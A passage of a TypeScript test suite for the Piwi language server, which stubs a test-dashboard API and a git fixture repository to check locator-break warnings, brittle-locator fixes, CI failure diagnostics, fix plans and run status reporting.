import * as fs from 'node:fs';
import * as http from 'node:http';
import * as os from 'node:os';
import * as path from 'node:path';
import { execFileSync, spawn } from 'node:child_process';
import { PassThrough } from 'node:stream';
import type { AddressInfo } from 'node:net';
import { pathToFileURL } from 'node:url';
import { afterAll, beforeAll, describe, expect, test } from 'vitest';
import {
  createMessageConnection,
  StreamMessageReader,
  StreamMessageWriter,
  type MessageConnection,
} from 'vscode-jsonrpc/node';
import { createConnection } from 'vscode-languageserver/node';
import type { LocatorIndex } from '@piwitests/core/locator-index';
import { buildSession, type RecordedStep } from '@piwitests/core/recording';
import { toStepsDocument } from '@piwitests/core/steps';
import { startServer } from '../src/server';
import { committedTextAt } from '../src/workspace';
import type {
  AgentContextResult,
  ApplyPickResult,
  FailuresResult,
  FileSummary,
  McpServersResult,
  Notice,
  PageCandidatesResult,
  RecordResult,
  RecordingUpdate,
  RenderStepsResult,
  RunCommand,
  RunEnded,
  RunStatusResult,
  RunTestsArgs,
  ScreenshotResult,
  StatusResult,
  TestAtResult,
  TestsForFile,
  TraceResult,
} from '../src/protocol';
import type { LaunchRequest, ServiceToLauncher } from '../src/recorder/ipc';
import type { LauncherEvents } from '../src/recorder/sessions';

const use = (test: number, site: string, actions = ['click']) => ({
  test,
  actions,
  callSites: [site],
  projects: ['chromium'],
  branches: ['main'],
});

const INDEX: LocatorIndex = {
  projectId: 7,
  projectName: 'Acme Mugs',
  branch: null,
  defaultBranch: 'main',
  branches: [],
  builtAt: null,
  generatedAt: '2026-09-27T00:00:00Z',
  testIdAttributes: null,
  pages: ['/checkout'],
  tests: [
    { id: 1, title: 'pays', file: 'tests/checkout.spec.ts', suite: [], status: 'passed' },
    { id: 2, title: 'pays by card', file: 'tests/checkout.spec.ts', suite: [], status: 'flaky' },
    { id: 3, title: 'removes a row', file: 'tests/rows.spec.ts', suite: [], status: 'failed' },
  ],
  locators: [
    {
      locator: "getByRole('button', { name: 'Pay now' })",
      lastSeenAt: '',
      uses: [
        { ...use(0, 'tests/pages/checkout.page.ts:4:21'), pages: [0] },
        { ...use(1, 'tests/pages/checkout.page.ts:4:21'), pages: [0] },
      ],
    },
    {
      locator: "locator('.cart-row').nth(2)",
      lastSeenAt: '',
      uses: [{ ...use(2, 'tests/pages/checkout.page.ts:5:21'), pages: [0] }],
    },
  ],
  truncated: false,
};

const PAGE_OBJECT = [
  "import type { Page } from '@playwright/test';",
  'export class CheckoutPage {',
  '  constructor(private readonly page: Page) {}',
  '  pay = () => this.page.getByRole(\'button\', { name: "Pay now" });',
  "  row = () => this.page.locator('.cart-row').nth(2);",
  '}',
  '',
].join('\n');

const SPEC = ["import { test } from '@playwright/test';", '', "test('pays', async ({ page }) => {});", ''].join('\n');

/** The spec of the test that failed: through `checkout.row()` on line 7 (0-based 6), into the page object. */
const FAILING_SPEC = [
  "import { test } from '@playwright/test';",
  "import { CheckoutPage } from './pages/checkout.page';",
  '',
  "test('removes a row', async ({ page }) => {",
  '  const checkout = new CheckoutPage(page);',
  "  await page.goto('/checkout');",
  '  await checkout.row().click();',
  '});',
  '',
].join('\n');

const COMPONENT = '<template>\n  <button class="pay">\n    Pay now\n  </button>\n</template>\n';

/** The latest complete run on main: a CI run. */
const MAIN_RUN = {
  id: 41,
  status: 'failed',
  branch: 'main',
  startTime: '2026-09-27T10:00:00.000Z',
  totalTests: 3,
  passedTests: 1,
  failedTests: 1,
  flakyTests: 1,
  skippedTests: 0,
};

/** Its failure: through `checkout.row()` in the spec, into the page object. */
const ROW_FAILURE = {
  executionId: 900,
  testCaseId: 3,
  clusterId: 77,
  title: 'removes a row',
  file: 'tests/rows.spec.ts',
  line: 4,
  status: 'failed',
  headline: "locator('.cart-row').nth(2) was not found",
  location: '/ci/work/tests/pages/checkout.page.ts:5:21',
  message: "Error: locator.click: Timeout 5000ms exceeded.\nCall log:\n  - waiting for locator('.cart-row').nth(2)",
  frames: ['/ci/work/tests/pages/checkout.page.ts:5:21', '/ci/work/tests/rows.spec.ts:7:18'],
  traces: ['traces/900.zip'],
  screenshot: 'shots/900.png',
};

/** What the instance answers with the runs laid over run #41, once a test sets it; with none laid over it otherwise. */
let laidOver: unknown = null;

/** The fixture repository's one commit, which run #41 ran at: the files the failures are followed from. */
let fixtureCommit = '';

/** What the instance answers for a run's arguments and the smoke selection's command, once a test sets them. */
let hostileMaterialization: unknown = null;
let hostileSelectionCommand: string | null = null;

/**
 * The API key of the service the tests of runs as they happen start: the stub streams the instance's events to that
 * key only, and is an instance without the route for every other.
 */
const RUNS_KEY = 'pd_runs';
/** The instance's event streams open with that key, which a test pushes events into. */
const instanceStreams = new Set<http.ServerResponse>();
/** One run's event streams, by run. */
const runStreams = new Map<number, Set<http.ServerResponse>>();
/** Runs as `GET /api/test-runs/:id` answers them. */
const runDetails = new Map<number, Record<string, unknown>>();
/** Runs whose stream the instance answers with a 404, and the requests it refused, by run. */
const goneRunStreams = new Map<number, number>();
/** The run each ref names, as `latest-run?origin=editor&ref=` answers it. */
const refRuns = new Map<string, { id: number; status: string }>();
/** The `latest-run` lookups of each ref. */
const refLookups = new Map<string, number>();
/** What the instance answers that service with the runs laid over run #41, once a test sets it. */
let runsLaidOver: unknown = null;
/** The `branch-failures` reads of that service. */
let runsReads = 0;
/** The API key of the service the tests of the baseline start: the stub answers its chosen baselines. */
const BASELINE_KEY = 'pd_baseline';
/** The query of each `branch-failures` read of that service. */
const baselineReads: URLSearchParams[] = [];
/**
 * The API key of the service the tests of a slow instance start: the stub answers it as an instance from before the
 * catalog's search values and the selections resolved together, and holds its flake-lab and selections reads until a
 * test lets them through.
 */
const SLOW_KEY = 'pd_slow';
/** Lets the reads that service's stub holds through; null once called. */
let releaseSlow: (() => void) | null = null;
const slowReleased = new Promise<void>((resolve) => (releaseSlow = resolve));
/** The reads that service's stub held. */
let slowHeld = 0;

function openEvents(res: http.ServerResponse): void {
  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' });
  res.write(': connected\n\n');
}

const sendEvent = (res: http.ServerResponse, data: unknown) => res.write(`data: ${JSON.stringify(data)}\n\n`);

/** An event on the instance's stream. */
function pushInstanceEvent(event: { type: string; runId: number; projectId: number; status?: string }): void {
  for (const res of instanceStreams) sendEvent(res, event);
}

/** An event on one run's stream. */
function pushRunEvent(runId: number, type: string, data: Record<string, unknown>): void {
  for (const res of runStreams.get(runId) ?? []) sendEvent(res, { type, data, seq: 1, timestamp: Date.now() });
}

let dir = '';
let server: http.Server;
let url = '';
let client: MessageConnection;
let stop: () => void;
const runStatuses: RunStatusResult[] = [];
/** The `piwi/failuresChanged` notifications of the first service, in order. */
const failuresChanges: FailuresResult[] = [];
const diagnostics = new Map<
  string,
  Array<{ message: string; code?: string; severity?: number; range: unknown; data?: unknown; source?: string }>
>();

function write(file: string, text: string): string {
  const full = path.join(dir, file);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, text);
  return full;
}

const uri = (file: string) => pathToFileURL(path.join(dir, file)).href;

async function waitFor<T>(read: () => T | undefined | Promise<T | undefined>, ms = 5000): Promise<T> {
  const start = Date.now();
  for (;;) {
    const value = await read();
    if (value !== undefined) return value;
    if (Date.now() - start > ms) throw new Error('timed out');
    await new Promise((r) => setTimeout(r, 20));
  }
}

beforeAll(async () => {
  server = http.createServer((req, res) => {
    res.setHeader('Content-Type', 'application/json');
    const u = req.url ?? '';
    const runsKey = req.headers['x-api-key'] === RUNS_KEY;
    const slowKey = req.headers['x-api-key'] === SLOW_KEY;
    if (slowKey && releaseSlow && /^\/api\/projects\/7\/(flake-lab|selections)\b/.test(u)) {
      slowHeld++;
      void slowReleased.then(() => server.emit('request', req, res));
      return;
    }
    if (u === '/api/stream' && runsKey) {
      openEvents(res);
      instanceStreams.add(res);
      res.on('close', () => instanceStreams.delete(res));
      return;
    }
    const runStream = /^\/api\/test-runs\/(\d+)\/stream$/.exec(u);
    if (runStream && goneRunStreams.has(Number(runStream[1]))) {
      const id = Number(runStream[1]);
      goneRunStreams.set(id, goneRunStreams.get(id)! + 1);
      res.statusCode = 404;
      return res.end('{}');
    }
    const streamed = runStream ? runDetails.get(Number(runStream[1])) : undefined;
    if (runStream && streamed) {
      const id = Number(runStream[1]);
      openEvents(res);
      const { status, totalTests, passedTests, failedTests, skippedTests } = streamed;
      sendEvent(res, {
        type: 'init',
        data: { id, status, totalTests, passedTests, failedTests, skippedTests },
        seq: 0,
      });
      const open = runStreams.get(id) ?? new Set();
      runStreams.set(id, open.add(res));
      res.on('close', () => open.delete(res));
      return;
    }
    const details = /^\/api\/test-runs\/(\d+)$/.exec(u);
    if (details && runDetails.has(Number(details[1])))
      return res.end(JSON.stringify(runDetails.get(Number(details[1]))));
    if (u.startsWith('/api/projects/7/latest-run?')) {
      const query = new URL(u, url).searchParams;
      const ref = query.get('ref') ?? '';
      refLookups.set(ref, (refLookups.get(ref) ?? 0) + 1);
      const found = query.get('origin') === 'editor' ? refRuns.get(ref) : undefined;
      return res.end(JSON.stringify(found ?? null));
    }
    if (u === '/api/projects/menu') return res.end(JSON.stringify({ items: [{ id: 7, name: 'Acme Mugs' }] }));
    const baselineKey = req.headers['x-api-key'] === BASELINE_KEY;
    if (u.startsWith('/api/projects/7/locator-index')) {
      const branches = [{ name: 'feature/x', lastSeenAt: '2026-09-27T00:00:00Z', tests: 3 }];
      return res.end(JSON.stringify(baselineKey ? { ...INDEX, branches } : INDEX));
    }
    if (u.startsWith('/api/projects/7/code-index')) {
      return res.end(
        JSON.stringify({
          files: ['src/components/CheckoutButton.vue'],
          tests: [INDEX.tests[0], INDEX.tests[1]],
          reach: [{ file: 0, tests: [0, 1], origin: 'client' }],
          builtAt: null,
          truncated: false,
        }),
      );
    }
    if (u === '/api/projects/7/test-cases/facets') {
      if (slowKey) {
        res.statusCode = 404;
        return res.end('{}');
      }
      return res.end(
        JSON.stringify({
          values: {
            tag: [
              { value: 'smoke', count: 2 },
              { value: 'checkout', count: 1 },
            ],
            feature: [{ value: 'Payments', count: 1 }],
          },
        }),
      );
    }
    if (u === '/api/projects/7/test-cases?limit=1000' && slowKey) {
      return res.end(JSON.stringify({ items: [{ tags: ['smoke', 'checkout'], feature: 'Payments' }] }));
    }
    if (u === '/api/projects/7/test-cases?limit=1000&file=tests%2Frows.spec.ts') {
      return res.end(
        JSON.stringify({
          items: [
            {
              id: 3,
              title: 'removes a row',
              filePath: 'tests/rows.spec.ts',
              status: 'failed',
              totalRuns: 9,
              passedRuns: 6,
            },
          ],
        }),
      );
    }
    if (u.startsWith('/api/projects/7/test-cases')) {
      return res.end(
        JSON.stringify({
          items: [
            {
              id: 1,
              title: 'pays',
              filePath: 'tests/checkout.spec.ts',
              status: 'passed',
              totalRuns: 50,
              passedRuns: 48,
            },
          ],
        }),
      );
    }
    if (u.startsWith('/api/projects/7/locator-alternatives')) {
      return res.end(
        JSON.stringify({
          items: [
            {
              testCaseId: 3,
              location: 'tests/pages/checkout.page.ts:5:21',
              method: 'locator',
              lastSeenAt: '2026-09-26T00:00:00Z',
              alternatives: [
                { locator: "locator('.cart-row').nth(2)", method: 'locator', args: {}, score: 20 },
                { locator: "getByRole('row', { name: /Mug/ })", method: 'getByRole', args: {}, score: 85 },
              ],
            },
          ],
        }),
      );
    }
    if (u.startsWith('/api/projects/7/branch-failures?') && baselineKey) {
      const query = new URL(u, url).searchParams;
      baselineReads.push(query);
      const answer = (run: Record<string, unknown> | null, failures: unknown[] = [], overlays: unknown[] = []) =>
        res.end(JSON.stringify({ run, overlays, failures, resolved: [] }));
      const ci = { ...MAIN_RUN, origin: 'ci', commit: fixtureCommit };
      if (query.get('run') === '119') {
        // A run on a developer's machine, chosen as the baseline.
        const local = { ...MAIN_RUN, id: 119, origin: 'local', commit: null };
        const failure = { ...ROW_FAILURE, executionId: 1190, source: 'baseline', runId: 119, screenshot: null };
        return answer(local, [failure]);
      }
      if (query.get('run')) {
        if (query.get('run') !== '118') {
          res.statusCode = 404;
          return res.end('{}');
        }
        const failure = { ...ROW_FAILURE, executionId: 1180, source: 'baseline', runId: 118 };
        return answer({ ...ci, id: 118, branch: 'feature/x' }, [failure]);
      }
      if (query.get('origin') === 'local') {
        if (query.get('branch') !== 'main') return answer(null);
        const overlay = {
          id: 60,
          status: 'failed',
          origin: 'local',
          isFullRun: false,
          startTime: '2026-09-27T11:00:00.000Z',
          commit: null,
          totalTests: 1,
          passedTests: 0,
          failedTests: 1,
          flakyTests: 0,
          skippedTests: 0,
        };
        const failure = { ...ROW_FAILURE, executionId: 600, source: 'overlay', runId: 60, isNew: true };
        return answer(null, [failure], [overlay]);
      }
      if (query.get('branch') === 'feature/x') return answer({ ...ci, id: 120, branch: 'feature/x' });
      if (query.get('branch') === 'main') return answer(ci, [ROW_FAILURE]);
      return answer(null);
    }
    if (u.startsWith('/api/projects/7/branch-failures?')) {
      const query = new URL(u, url).searchParams;
      const laid = query.get('overlays') === '1';
      if (runsKey) runsReads++;
      if (query.get('branch') !== 'main') {
        return res.end(
          JSON.stringify(laid ? { run: null, overlays: [], failures: [], resolved: [] } : { run: null, failures: [] }),
        );
      }
      const latest = { run: { ...MAIN_RUN, commit: fixtureCommit }, failures: [ROW_FAILURE] };
      const over = runsKey ? runsLaidOver : laidOver;
      return res.end(JSON.stringify(laid ? (over ?? { ...latest, overlays: [], resolved: [] }) : latest));
    }
    if (u === '/api/failure-clusters/77/fix-plan') {
      return res.end(
        JSON.stringify({
          cluster: { id: 77, title: 'Cart row not found', signature: 'sig' },
          diagnosis: {
            summary: 'The cart rows lost their class.',
            patch: [
              '--- a/tests/pages/checkout.page.ts',
              '+++ b/tests/pages/checkout.page.ts',
              '@@ -4,2 +4,2 @@',
              '   pay = () => this.page.getByRole(\'button\', { name: "Pay now" });',
              "-  row = () => this.page.locator('.cart-row').nth(2);",
              "+  row = () => this.page.getByRole('row').nth(2);",
              '',
            ].join('\n'),
            patchValidation: { status: 'applies', errors: [] },
          },
          edits: [],
          verify: { command: 'npx playwright test tests/checkout.spec.ts:3', expectation: 'The cluster resolves.' },
        }),
      );
    }
    if (u === '/api/failure-clusters/77/fix-plan?format=markdown') {
      res.setHeader('Content-Type', 'text/markdown');
      return res.end('# Fix plan — Cart row not found\n\nRun `npx playwright test tests/checkout.spec.ts:3`.\n');
    }
    if (u === '/api/test-run-cases/900/locator-healing') {
      return res.end(
        JSON.stringify({
          recommendation: { recommended: { locator: "getByRole('row', { name: /Mug/ })" } },
          edit: {
            filePath: 'tests/pages/checkout.page.ts',
            line: 5,
            oldLine: "  row = () => this.page.locator('.cart-row').nth(2);",
            newLine: "  row = () => this.page.getByRole('row', { name: /Mug/ });",
            unifiedDiff: null,
          },
        }),
      );
    }
    if (u === '/api/files/traces/900.zip' || u === '/api/files/shots/900.png') {
      res.setHeader('Content-Type', 'application/octet-stream');
      return res.end(Buffer.from('PK-stub'));
    }
    if (u === '/api/links?entityType=failure_cluster&entityId=77') {
      return res.end(
        JSON.stringify({
          items: [
            {
              url: 'https://jira.test/browse/SHOP-12',
              key: 'SHOP-12',
              title: 'Cart rows missing',
              statusText: 'In Progress',
            },
          ],
        }),
      );
    }
    if (u.startsWith('/api/links')) return res.end(JSON.stringify({ items: [] }));
    if (u === '/api/projects/7/quarantine?candidates=false') {
      return res.end(
        JSON.stringify({
          entries: [{ testCaseId: 1, ageMs: 5 * 86_400_000, consecutivePasses: 3, releaseProposed: false }],
          releaseAfterConsecutivePasses: 10,
        }),
      );
    }
    if (u === '/api/projects/7/selections?resolve=true') {
      const items = [
        {
          key: 'smoke',
          name: 'Smoke',
          resolved: {
            testCaseIds: [1],
            command: hostileSelectionCommand ?? 'npx playwright test tests/checkout.spec.ts:3',
          },
        },
        { key: 'failed', name: null, resolved: { testCaseIds: [3], command: 'npx playwright test --grep x' } },
      ];
      // An instance that does not read `resolve` lists the selections alone.
      return res.end(JSON.stringify({ items: slowKey ? items.map(({ resolved: _, ...s }) => s) : items }));
    }
    if (u === '/api/projects/7/selections/smoke/resolve' && slowKey) {
      return res.end(
        JSON.stringify({
          tests: [{ testCaseId: 1 }],
          materialization: {
            args: ['tests/checkout.spec.ts:3'],
            command: 'npx playwright test tests/checkout.spec.ts:3',
          },
        }),
      );
    }
    if (u === '/api/projects/7/selections/failed/resolve' && slowKey) {
      return res.end(
        JSON.stringify({
          tests: [{ testCaseId: 3 }],
          materialization: { args: [], command: 'npx playwright test --grep x' },
        }),
      );
    }
    if (u === '/api/projects/7/timeout-opportunities') {
      return res.end(
        JSON.stringify({
          items: [
            {
              testCaseId: 1,
              kind: 'stale-slow',
              timeout: 90000,
              p95: 4100,
              recommendedTimeout: null,
              estimatedSavingMs: 0,
            },
          ],
        }),
      );
    }
    if (u.startsWith('/api/projects/7/flake-lab?')) {
      return res.end(
        JSON.stringify({
          tests: [
            {
              testCaseId: 1,
              state: 'reproduced',
              nextCommand: 'npx @piwitests/reporter flake verify 1',
              flaky: true,
              reproducedBy: 'delay GET /api/cart 1.8 s',
              flakeRate: 0.18,
              suspect: {
                id: 'slow-route:GET /api/cart',
                label: 'slow GET /api/cart',
                standing: 'reproduced',
                lab: 'reproduced 7 of 10',
              },
            },
            {
              testCaseId: 3,
              state: 'untested',
              nextCommand: 'npx @piwitests/reporter flake 3',
              flaky: false,
              reproducedBy: null,
              flakeRate: null,
              suspect: {
                id: 'slow-route:GET /api/rows',
                label: 'slow GET /api/rows',
                standing: 'untested',
                lab: 'untested',
              },
              untestedSuspects: 2,
            },
          ],
        }),
      );
    }
    if (u.startsWith('/api/projects/7/flaky-tests')) {
      return res.end(
        JSON.stringify({ items: [{ testCaseId: 1, score: 42, wastedCiMinutes: 12.4, rootCause: 'timing' }] }),
      );
    }
    if (u === '/api/projects/7/test-functions') {
      const entry = (id: number, name: string, urlPattern: string | null) => ({
        id,
        name,
        kind: 'page-object-method',
        module: 'tests/pages/checkout.page.ts',
        receiver: 'checkoutPage',
        importName: 'CheckoutPage',
        params: [{ name: 'amount', type: 'string' }],
        urlPattern,
        steps: [{ action: 'fill', target: { testId: 'not-on-the-page' } }],
        paramSources: [],
      });
      return res.end(
        JSON.stringify({
          testFunctions: [{ entry: entry(1, 'pay', '**/checkout') }, { entry: entry(2, 'login', '**/login') }],
        }),
      );
    }
    if (u === '/api/projects/7/feature-map') return res.end(JSON.stringify({ features: [{ key: 'Cart' }] }));
    if (u === '/api/projects/7/selections/preview') {
      return res.end(
        JSON.stringify({
          materialization: hostileMaterialization ?? {
            args: ['tests/checkout.spec.ts:3'],
            command: 'npx playwright test tests/checkout.spec.ts:3',
          },
        }),
      );
    }
    res.statusCode = 404;
    res.end('{}');
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  url = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;

  dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'piwi-editor-')));
  const git = (...args: string[]) =>
    execFileSync('git', ['-c', 'user.email=t@example.com', '-c', 'user.name=t', ...args], {
      cwd: dir,
      stdio: 'ignore',
    });
  git('init', '-q', '-b', 'main');
  write('playwright.config.ts', 'export default {};\n');
  write('src/components/CheckoutButton.vue', COMPONENT);
  write('tests/pages/checkout.page.ts', PAGE_OBJECT);
  write('tests/checkout.spec.ts', SPEC);
  write('tests/rows.spec.ts', FAILING_SPEC);
  write('src/unreached.ts', "export const x = 'y';\n");
  write('app/pages/checkout.vue', '<template><div /></template>\n');
  git('add', '.');
  git('commit', '-q', '-m', 'init');
  fixtureCommit = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: dir, encoding: 'utf-8' }).trim();

  const toServer = new PassThrough();
  const toClient = new PassThrough();
  stop = startServer(createConnection(toServer, toClient), {
    env: { PIWI_DASHBOARD_URL: url, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: '/nonexistent' },
    debounceMs: 10,
  });
  client = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
  client.onNotification('textDocument/publishDiagnostics', (p: { uri: string; diagnostics: never[] }) => {
    diagnostics.set(p.uri, p.diagnostics);
  });
  client.onNotification('piwi/runStatusChanged', (p: RunStatusResult) => {
    runStatuses.push(p);
  });
  client.onNotification('piwi/failuresChanged', (p: FailuresResult) => {
    failuresChanges.push(p);
  });
  client.listen();
  const init = await client.sendRequest('initialize', {
    processId: null,
    rootUri: null,
    capabilities: {},
    workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
  });
  expect(init).toMatchObject({ capabilities: { hoverProvider: true } });
  await client.sendNotification('initialized', {});
  // The indexes are fetched in the background, the code index after the latest run's failures: wait until the
  // status shows both.
  await waitFor(() => (ready ? true : undefined));
});

let ready = false;
const pollStatus = setInterval(async () => {
  if (!client || ready) return;
  const status = (await client.sendRequest('piwi/status').catch(() => null)) as StatusResult | null;
  const context = status?.contexts[0];
  ready = !!context?.connected && context.reachedFiles > 0;
}, 30);

afterAll(async () => {
  clearInterval(pollStatus);
  stop?.();
  client?.dispose();
  server.closeAllConnections();
  await new Promise<void>((resolve) => server.close(() => resolve()));
  fs.rmSync(dir, { recursive: true, force: true });
});

function open(file: string, text: string, version = 1) {
  diagnostics.delete(uri(file));
  return client.sendNotification('textDocument/didOpen', {
    textDocument: { uri: uri(file), languageId: file.endsWith('.vue') ? 'vue' : 'typescript', version, text },
  });
}

/** An edit of an open document, sent as its whole new text. */
function change(file: string, text: string, version: number) {
  return client.sendNotification('textDocument/didChange', {
    textDocument: { uri: uri(file), version },
    contentChanges: [{ text }],
  });
}

describe('the Piwi language server', () => {
  test('reports its context', async () => {
    const status = (await client.sendRequest('piwi/status')) as StatusResult;
    expect(status.contexts).toEqual([
      expect.objectContaining({
        root: dir,
        connected: true,
        source: 'environment',
        projectName: 'Acme Mugs',
        branch: 'main',
        locators: 2,
        reachedFiles: 1,
      }),
    ]);
  });

  test('warns on the line of an unsaved rename that breaks locators, and fixes the call sites', async () => {
    await open('src/components/CheckoutButton.vue', COMPONENT.replace('Pay now', 'Pay'));
    const diags = await waitFor(() => diagnostics.get(uri('src/components/CheckoutButton.vue')));
    expect(diags).toHaveLength(1);
    expect(diags[0]).toMatchObject({
      source: 'Piwi',
      code: 'locator-break',
      severity: 2,
      range: { start: { line: 2, character: 4 }, end: { line: 2, character: 7 } },
    });
    expect(diags[0]!.message).toBe(
      `2 tests find an element by "Pay now" ("Pay now" → "Pay"): getByRole('button', { name: 'Pay now' })`,
    );

    const actions = (await client.sendRequest('textDocument/codeAction', {
      textDocument: { uri: uri('src/components/CheckoutButton.vue') },
      range: diags[0]!.range,
      context: { diagnostics: diags },
    })) as Array<{
      title: string;
      edit: { changes: Record<string, Array<{ newText: string; range: { start: { line: number } } }>> };
    }>;
    expect(actions.map((a) => a.title)).toEqual(['Update 1 locator in checkout.page.ts']);
    const edits = actions[0]!.edit.changes[uri('tests/pages/checkout.page.ts')]!;
    expect(edits).toEqual([
      expect.objectContaining({
        newText: '  pay = () => this.page.getByRole(\'button\', { name: "Pay" });',
        range: expect.objectContaining({ start: { line: 3, character: 0 } }),
      }),
    ]);

    const hover = (await client.sendRequest('textDocument/hover', {
      textDocument: { uri: uri('src/components/CheckoutButton.vue') },
      position: { line: 2, character: 5 },
    })) as { contents: { value: string } };
    expect(hover.contents.value).toContain("→ `getByRole('button', { name: 'Pay' })`");
  });

  test('a rename the locators still match is not a warning', async () => {
    await open('src/components/CheckoutButton.vue', COMPONENT.replace('Pay now', 'Pay now!'), 2);
    const diags = await waitFor(() => diagnostics.get(uri('src/components/CheckoutButton.vue')));
    expect(diags).toEqual([]);
  });

  test('flags a brittle locator in a page object, with the stored stable alternative as the fix', async () => {
    await open('tests/pages/checkout.page.ts', PAGE_OBJECT);
    const diags = await waitFor(() => diagnostics.get(uri('tests/pages/checkout.page.ts')));
    const brittle = diags.find((d) => d.code === 'brittle')!;
    expect(brittle).toMatchObject({ severity: 2, range: { start: { line: 4, character: 24 } } });
    expect(brittle.message).toMatch(/^Brittle: .* · 1 test$/);
    const actions = (await client.sendRequest('textDocument/codeAction', {
      textDocument: { uri: uri('tests/pages/checkout.page.ts') },
      range: brittle.range,
      context: { diagnostics: [brittle] },
    })) as Array<{ title: string; edit: { changes: Record<string, Array<{ newText: string }>> } }>;
    expect(actions[0]!.title).toBe("Use getByRole('row', { name: /Mug/ }) (as of the last passing run)");
    expect(actions[0]!.edit.changes[uri('tests/pages/checkout.page.ts')]![0]!.newText).toBe(
      "  row = () => this.page.getByRole('row', { name: /Mug/ });",
    );

    const hover = (await client.sendRequest('textDocument/hover', {
      textDocument: { uri: uri('tests/pages/checkout.page.ts') },
      position: { line: 3, character: 30 },
    })) as { contents: { value: string } };
    expect(hover.contents.value).toContain("**`getByRole('button', { name: 'Pay now' })`** · 2 tests · click");
    expect(hover.contents.value).toContain('Pages: `/checkout`');
  });

  test('lists the latest run’s failures at their failing line, with the heal, the trace and the page', async () => {
    const all = await waitFor(() => diagnostics.get(uri('tests/pages/checkout.page.ts')));
    const failure = all.find((d) => d.code === 'ci-failure')!;
    expect(failure).toMatchObject({
      severity: 1,
      source: 'Piwi',
      message: "locator('.cart-row').nth(2) was not found (removes a row, run #41)",
      range: { start: { line: 4, character: 2 } },
      codeDescription: { href: `${url}/test-run-cases/900` },
    });
    const actions = (await client.sendRequest('textDocument/codeAction', {
      textDocument: { uri: uri('tests/pages/checkout.page.ts') },
      range: failure.range,
      context: { diagnostics: [failure] },
    })) as Array<{
      title: string;
      edit?: { changes: Record<string, Array<{ newText: string }>> };
      command?: { command: string; arguments: unknown[] };
    }>;
    expect(actions.map((a) => a.title)).toEqual([
      "Heal: use getByRole('row', { name: /Mug/ })",
      'Run this test',
      'Open the trace',
      'Apply the fix plan (1 file), then run its verification',
      'Copy context for agent',
      'Open the failure in the dashboard',
    ]);
    expect(actions[1]!.command).toEqual({
      title: 'Run this test',
      command: 'piwi.runTests',
      arguments: [{ uri: uri('tests/pages/checkout.page.ts'), root: dir, testIds: [3] }],
    });
    const apply = actions[3] as unknown as {
      edit: { changes: Record<string, Array<{ newText: string }>> };
      command: { command: string; arguments: unknown[] };
    };
    expect(apply.edit.changes[uri('tests/pages/checkout.page.ts')]![0]!.newText).toBe(
      PAGE_OBJECT.replace("this.page.locator('.cart-row').nth(2)", "this.page.getByRole('row').nth(2)"),
    );
    expect(apply.command).toEqual({
      title: 'Run the verification',
      command: 'piwi.runCommand',
      arguments: [
        { cwd: dir, command: 'npx playwright test tests/checkout.spec.ts:3', env: { PIWI_ORIGIN: 'editor' } },
      ],
    });
    // The context is gathered once the action is picked.
    expect(actions[4]!.command).toEqual({
      title: 'Copy context for agent',
      command: 'piwi.copyAgentContext',
      arguments: [{ uri: uri('tests/pages/checkout.page.ts'), executionId: 900 }],
    });
    const gathered = (await client.sendRequest('piwi/agentContext', actions[4]!.command!.arguments[0])) as {
      text: string;
    };
    const context = gathered.text.split('\n');
    expect(context.slice(0, 3)).toEqual([
      '# Failing test: removes a row',
      '',
      "locator('.cart-row').nth(2) was not found",
    ]);
    expect(context).toContain("Replace the failing locator with `getByRole('row', { name: /Mug/ })`:");
    expect(context).toContain('# Fix plan — Cart row not found');
    expect(actions[0]!.edit!.changes[uri('tests/pages/checkout.page.ts')]![0]!.newText).toBe(
      "  row = () => this.page.getByRole('row', { name: /Mug/ });",
    );
    expect(actions[2]!.command).toEqual({
      title: 'Open the trace',
      command: 'piwi.openTrace',
      arguments: [{ uri: uri('tests/pages/checkout.page.ts'), executionId: 900 }],
    });
    // A client that previews annotated edits gets the plan as a confirmed change; this one does not.
    expect(JSON.stringify(actions[3])).not.toContain('annotationId');

    const hover = (await client.sendRequest('textDocument/hover', {
      textDocument: { uri: uri('tests/pages/checkout.page.ts') },
      position: { line: 4, character: 30 },
    })) as { contents: { value: string } };
    expect(hover.contents.value).toContain(`**CI failure** · [removes a row](${url}/test-run-cases/900) · run #41`);
    expect(hover.contents.value).toMatch(/!\[Failure screenshot\]\(file:\/\/.*900\.png\)/);
    expect(hover.contents.value).toContain(
      'Known issue: [SHOP-12 Cart rows missing](https://jira.test/browse/SHOP-12) · In Progress',
    );
    expect(hover.contents.value).toContain("**`locator('.cart-row').nth(2)`**");

    const trace = (await client.sendRequest('piwi/trace', {
      uri: uri('tests/pages/checkout.page.ts'),
      executionId: 900,
    })) as TraceResult;
    expect(trace.cwd).toBe(dir);
    expect(fs.readFileSync(trace.path, 'utf-8')).toBe('PK-stub');
    expect(trace.command).toBe(`npx playwright show-trace "${trace.path}"`);
  });

  test('reports the run status, and pushes it when it changes', async () => {
    const status = (await client.sendRequest('piwi/runStatus')) as RunStatusResult;
    expect(status.contexts).toEqual([
      {
        root: dir,
        branch: 'main',
        checkedOut: 'main',
        run: expect.objectContaining({ id: 41, status: 'failed', failedTests: 1, url: `${url}/test-runs/41` }),
        failures: 1,
        failingTests: 1,
        resolved: 0,
        overlays: 0,
        live: null,
        // This instance has no event stream: the run is read every minute.
        stream: 'polling',
        updatedAt: expect.any(String),
        // The fixture installs no reporter.
        reporterVersion: null,
        // An instance that does not say what launched the run.
        baseline: { choice: { kind: 'ladder' }, label: 'run #41 on main' },
        branches: ['main'],
      },
    ]);
    expect(runStatuses[runStatuses.length - 1]).toEqual(status);
  });

  test('lists the failures where they show, with their run, for clients that list them natively', async () => {
    const failures = (await client.sendRequest('piwi/failures')) as FailuresResult;
    expect(failures).toEqual({
      items: [
        {
          uri: uri('tests/pages/checkout.page.ts'),
          root: dir,
          line: 4,
          title: 'removes a row',
          headline: "locator('.cart-row').nth(2) was not found",
          executionId: 900,
          runId: 41,
          url: `${url}/test-run-cases/900`,
          hasTrace: true,
          source: 'ci',
          state: 'failing',
          browserName: null,
